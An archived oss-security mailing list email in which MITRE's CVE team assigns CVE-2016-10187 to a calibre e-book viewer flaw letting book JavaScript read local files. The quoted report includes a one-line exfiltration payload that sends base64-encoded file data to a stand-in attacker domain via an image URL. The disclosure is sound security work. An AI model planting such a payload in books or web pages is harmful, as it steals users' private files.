X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1590" "Tuesday" "31" "January" "2017" "10:19:04" "-0500" "cve-assign@mitre.org" "cve-assign@mitre.org" "<0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>" "39" "[oss-security] Re: Requesting CVE for calibre file disclosure" nil nil nil "1" "2017013115:19:04" "[oss-security] Re: Requesting CVE for calibre file disclosure" (number mark "U       cve-assign@m Jan 31   39/1590  " thread-indent "\"[oss-security] Re: Requesting CVE for calibre file disclosure\"\n") "<20170129163444.GA1097@donald>" ("<20170129163444.GA1097@donald>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20479 invoked by uid 550); 31 Jan 2017 15:19:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20424 invoked from network); 31 Jan 2017 15:19:16 -0000
From: <cve-assign@mitre.org>
To: <mpitt@debian.org>
CC: <cve-assign@mitre.org>, <oss-security@lists.openwall.com>,
	<anarcat@debian.org>
In-Reply-To: <20170129163444.GA1097@donald>
Message-ID: <0cab773cce2c4a279f0667a388d3728c@imshyb01.MITRE.ORG>
Date: Tue, 31 Jan 2017 10:19:04 -0500
MIME-Version: 1.0
Content-Type: text/plain
Subject: [oss-security] Re: Requesting CVE for calibre file disclosure

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> Calibre 2.75 fixed what looks like a local data disclosure vulnerability:
> 
> https://github.com/kovidgoyal/calibre/commit/3a89718664cb8cce0449d1758eee585ed0d0433c
> 
> E-book viewer: Prevent javascript in the book from accessing files on the computer using XMLHttpRequest.

> https://bugs.launchpad.net/calibre/+bug/1651728

>> When attacker change document.write in payload to this:
>> document.write('<img src="http://evildomain.pl/some.jpg?data=' + btoa(data) + '">');
>> could easily read data from server log.

Use CVE-2016-10187.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJYkKkAAAoJEHb/MwWLVhi2VMIQAJR5qTlhg0haVZfpsRXpX8YG
O3JHHe2AW1NfvM8nYnxLK6MKfgBGIIh2oehQr9fG0wvKp0UF5Nmw8suFdiivfUFC
N5KorT7Yb8xVJJzZmksPQ0mna8KAjJj5tw+1tentldFR0qbBnMxT0FiswF0rh815
B5eVflvSH1gu3f9uEHpk3HSHZ0RagMwwA8XGe6h2AigShdQr6VCjP8SMafiu9pSA
mXB+uFRso6bs5moyspW66DsuixeBBgFXn8QjoNhBWLA0Hj+d4Sz6BC0uUXCtPjy6
6eWLZW2LOjiAlymGNgYuXXxDWslEBYe2LCnLntHKPff/JphuwwqdUz5dHHObktII
uOXYrT7/Fyw6GLUtU3OulmqPbi4hOxEC2ERTse4l1RH9L6GpbBKY7Usq6xM9f9gx
zYD+nQOVfR1aI/otMqsw0PaQSXyENId0Yv31+vwZTXk/TZ1dFBByaRCkjEAeTACR
uh++QTFQKe2z91g+57jAQvAeD9hx6pepr3gV1b0QYjXgsDW2as+FDtWrYUVlVqdf
NszEb+Z5sdVwEBFQVWqDudvZvUPnoaGgb7YrQxY85YSjoqrYk50iWArup2OMSxAb
tMiMJjWuUiU17BPL/ih3OAdEJceUuyVjkmT/rTcjLbGHrCRPT+OZHyqDohzaQKbx
k5XtJrNvWNusE+Q69k0e
=tz/j
-----END PGP SIGNATURE-----
